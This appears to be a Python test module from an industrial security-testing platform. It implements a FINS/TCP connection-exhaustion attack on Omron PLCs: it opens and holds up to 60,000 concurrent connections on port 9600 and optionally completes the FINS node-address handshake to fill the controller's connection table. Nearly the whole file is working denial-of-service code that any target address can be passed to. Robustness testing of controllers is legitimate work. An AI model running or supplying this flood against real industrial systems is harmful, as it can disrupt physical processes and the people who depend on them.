"""
測項：FINS/TCP 連線耗盡測試
分類：FINS (Omron PLC)（標準埠 TCP 9600）
說明：FINS/TCP 在正常 FINS 命令封包（Frame Send）交換前，要求 client 先完成一個
「Node Address Data Send/Receive」交握：client 連上 TCP 後先送出一個帶有 "FINS" magic
字串的握手封包，PLC/Ethernet 模組回覆分配的節點號後，該 TCP 連線才正式登記為一個
FINS 節點。多數 Omron PLC 內建 Ethernet 模組對「同時可登記的 FINS/TCP 節點數」有相當
有限的上限（遠低於一般作業系統的 TCP 連線數上限），超過上限時新連線會被 PLC 端拒絕
（韌體回覆特定錯誤碼，見下方協定欄位依據）。本測項建立並長時間持有大量並行 TCP 連線
（可選擇是否嘗試完成真正的握手），藉此測試該連線表上限與到達上限後的行為
（拒絕新連線 / 是否影響既有連線 / 上限被觸發後能否正常回收資源）。

協定欄位依據與已知限制（重要）：
  - FINS/TCP 握手層的「命令碼」與「錯誤碼」列表，已對照 Wireshark 官方 FINS 解析器
    原始碼（epan/dissectors/packet-omron-fins.c 之 tcp_command_cv[] / tcp_error_code_cv[]，
    該解析器為社群長期維護、被業界廣泛用於驗證真實 FINS 封包的參考實作）核對，信心程度高：
      command 0x00000000 = Node Address Data Send（Client -> Server，本測項送出的方向）
      command 0x00000001 = Node Address Data Send（Server -> Client，PLC 的回覆）
      error_code 0x00000000 = 正常
      error_code 0x00000020 = All connections are in use（連線數已達上限，本測項要驗證的目標行為）
      error_code 0x00000025 = All node addresses available for allocation have been used
      （其餘錯誤碼詳見 _TCP_ERROR_CODES 對照表）
  - 握手封包的「欄位組成」（4-byte "FINS" magic + 4-byte length + 4-byte command +
    4-byte error_code + 4-byte client_node_address，Server 回覆再加 4-byte
    server_node_address，皆為 big-endian）同樣對照上述 Wireshark 原始碼的欄位宣告順序
    （hf_omron_tcp_magic / length / command / error_code / client_node_address /
    server_node_address）確認無誤。
  - 唯一未能 100% 逐位元組核對官方手冊的部分：length 欄位的確切數值慣例（本實作採用
    業界最常見的慣例——length = 該欄位之後剩餘 bytes 數，即 client 請求為 12
    （command+error_code+client_node_address），server 回應為 16（再加
    server_node_address）），因 Omron 官方 W342/W342-E1 通訊指令參考手冊所在網域
    在本環境的出口網路政策下被封鎖（403，非本測項可控），未能取得官方 PDF 原文逐位元
    核對這個數值慣例，僅能以多個獨立第三方技術文件交叉比對後採用。若目標裝置對此
    數值慣例的實際要求有出入，握手仍可能被 PLC 判定為格式錯誤（error_code 0x00000001
    "The header is not 'FINS'" 之外的解析錯誤，或直接無回應/斷線）——即便如此，
    「TCP 三方交握完成、對方是否接受/如何回應/是否影響其餘連線」本身仍是本測項要
    測試的核心（連線表資源耗盡），因此即使握手內容不是每個位元組都與目標韌體
    完全一致，測試仍具備意義；可用 attempt_handshake=False 退回「純 TCP 連線持有」
    模式，僅測試作業系統/TCP 層連線數上限，不涉及 FINS 命令層假設。
  - 本測項僅止於連線建立與（可選的）握手交換，不送出任何 FINS 命令層請求
    （不含 Memory Area Read/Write 等），純粹測試連線表資源，符合安全限制。

攻擊端資源安全性：沿用 generic/tcp_conn_flood.py 的分批 spawn 執行緒策略
（避免一次性建立大量 OS 執行緒造成攻擊端本身變得不穩定），詳見該檔案 docstring。

需求：無額外套件（純標準函式庫 socket + struct + threading）。
"""
import socket
import struct
import threading
import time

from ..common import clamp_duration

NAME = "FINS/TCP 連線耗盡測試"
CATEGORY = "FINS (Omron PLC)"
PROTOCOL = "TCP"
DEFAULT_PORT = 9600
TEST_TYPE = "resource"  # 資源占用型：耗盡 PLC FINS/TCP 節點連線表上限

_TCP_MAGIC = b"FINS"

# 對照 Wireshark FINS 解析器 tcp_error_code_cv[]，見模組 docstring
_TCP_ERROR_CODES = {
    0x00000000: "Normal",
    0x00000001: "The header is not 'FINS' (ASCII code)",
    0x00000002: "The data length is too long",
    0x00000003: "The command is not supported",
    0x00000020: "All connections are in use（連線數已達上限）",
    0x00000021: "The specified node is already connected",
    0x00000022: "Attempt to access a protected node from an unspecified IP address",
    0x00000023: "The client FINS node address is out of range",
    0x00000024: "The same FINS node address is being used by the client and server",
    0x00000025: "All the node addresses available for allocation have been used",
}

_SPAWN_BATCH_SIZE = 100
_SPAWN_BATCH_STAGGER_SEC = 0.05


def get_param_schema() -> dict:
    return {
        "concurrent_connections": {
            "type": "int", "default": 60000, "min": 1, "max": 60000,
            "desc": "同時建立並持有的 FINS/TCP 連線數（PLC 端可登記的 FINS 節點數上限通常遠低於此值，"
                    "本平台上限沿用一般 TCP connection flood 測項的攻擊端執行緒安全上限）",
        },
        "attempt_handshake": {
            "type": "bool", "default": True,
            "desc": "True=連線後嘗試送出 FINS/TCP Node Address Data Send 握手封包（測 FINS 節點表上限）；"
                    "False=僅建立/持有原生 TCP 連線，不送任何 FINS 內容（測作業系統層連線數上限）",
        },
        "connect_timeout": {
            "type": "float", "default": 3.0, "min": 0.5, "max": 10.0,
            "desc": "單一連線的 TCP connect / 握手回應逾時秒數",
        },
    }


def _build_node_address_request(client_node: int = 0) -> bytes:
    """Client -> Server 的 Node Address Data Send 請求（command=0x00000000）。
    client_node=0 代表請求由 PLC 依來源 IP 自動配置節點號（常見慣例）。"""
    payload = struct.pack(">III", 0x00000000, 0x00000000, client_node & 0xFFFFFFFF)
    length = len(payload)
    return _TCP_MAGIC + struct.pack(">I", length) + payload


def _parse_node_address_response(data: bytes):
    """解析 Server -> Client 的回應；欄位/命令/錯誤碼定義見模組 docstring 說明。
    回傳 None 代表資料太短或 magic 不符（判定為非合法 FINS/TCP 回應）。"""
    if len(data) < 16 or data[0:4] != _TCP_MAGIC:
        return None
    command, error_code = struct.unpack(">II", data[8:16])
    client_node = struct.unpack(">I", data[16:20])[0] if len(data) >= 20 else None
    server_node = struct.unpack(">I", data[20:24])[0] if len(data) >= 24 else None
    return {"command": command, "error_code": error_code, "client_node": client_node, "server_node": server_node}


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    n = int(params.get("concurrent_connections", 350))
    attempt_handshake = bool(params.get("attempt_handshake", True))
    timeout = float(params.get("connect_timeout", 3.0))

    sockets = []
    lock = threading.Lock()
    stats = {
        "connected": 0, "connect_failed": 0,
        "handshake_ok": 0, "handshake_error": 0, "handshake_no_response": 0,
    }
    handshake_error_logged = [0]  # 用 list 包一層方便閉包內累加，僅供節流 log 行數用，非精確計數

    def open_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))
        except OSError:
            with lock:
                stats["connect_failed"] += 1
            return

        with lock:
            stats["connected"] += 1

        if attempt_handshake:
            try:
                s.sendall(_build_node_address_request())
                data = s.recv(64)
                resp = _parse_node_address_response(data)
                if resp is None:
                    with lock:
                        stats["handshake_no_response"] += 1
                elif resp["error_code"] == 0:
                    with lock:
                        stats["handshake_ok"] += 1
                else:
                    with lock:
                        stats["handshake_error"] += 1
                    if handshake_error_logged[0] < 5:
                        handshake_error_logged[0] += 1
                        msg = _TCP_ERROR_CODES.get(resp["error_code"], f"未知錯誤碼 0x{resp['error_code']:08X}")
                        log_fn(f"[i] FINS/TCP 握手回應錯誤：{msg}")
            except (OSError, socket.timeout):
                with lock:
                    stats["handshake_no_response"] += 1

        try:
            s.settimeout(None)
        except OSError:
            pass
        with lock:
            sockets.append(s)

    log_fn(
        f"[+] 嘗試建立 {n} 條 FINS/TCP 連線 -> {target}:{port}"
        f"（attempt_handshake={attempt_handshake}，分批 spawn，每批 {_SPAWN_BATCH_SIZE} 條）"
    )
    threads = []
    for batch_start in range(0, n, _SPAWN_BATCH_SIZE):
        if stop_event is not None and stop_event.is_set():
            log_fn("[!] stop_event 觸發，停止繼續建立新連線")
            break
        batch = [threading.Thread(target=open_one, daemon=True) for _ in range(min(_SPAWN_BATCH_SIZE, n - batch_start))]
        for t in batch:
            t.start()
        threads.extend(batch)
        if batch_start + _SPAWN_BATCH_SIZE < n:
            time.sleep(_SPAWN_BATCH_STAGGER_SEC)
    for t in threads:
        t.join(timeout=timeout + 2)

    log_fn(
        f"[+] 連線建立完成：connected={stats['connected']}, connect_failed={stats['connect_failed']}, "
        f"handshake_ok={stats['handshake_ok']}, handshake_error={stats['handshake_error']}, "
        f"handshake_no_response={stats['handshake_no_response']}；維持連線至測試結束或被停止"
    )

    start = time.time()
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        time.sleep(1)

    log_fn("[+] 關閉所有連線")
    for s in sockets:
        try:
            s.close()
        except OSError:
            pass

    return {
        "connected": stats["connected"],
        "connect_failed": stats["connect_failed"],
        "handshake_ok": stats["handshake_ok"],
        "handshake_error": stats["handshake_error"],
        "handshake_no_response": stats["handshake_no_response"],
        "elapsed_sec": round(time.time() - start, 1),
    }
